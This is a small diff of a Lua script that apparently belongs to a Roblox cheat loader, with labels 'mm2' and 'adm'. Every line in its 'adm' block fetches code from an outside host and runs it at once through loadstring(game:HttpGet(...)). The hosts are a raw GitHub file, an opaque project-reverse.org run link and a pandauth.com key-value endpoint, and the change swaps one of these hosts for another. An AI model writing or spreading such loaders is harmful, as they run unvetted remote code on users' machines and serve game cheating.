@@ -63,7 +63,7 @@ print("mm2")
 
     adm = [[
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjY3MTBjOTYyLTcxOTItNDcxYi04ZjQyLWNmOWExYThjNGFiNSIsImtpbmQiOiJtZWRpYSJ9"))()
+loadstring(game:HttpGet("https://vss.pandauth.com/kv/7b8d1ac09f2de1eb"))()
 print("adm")
     ]],
 
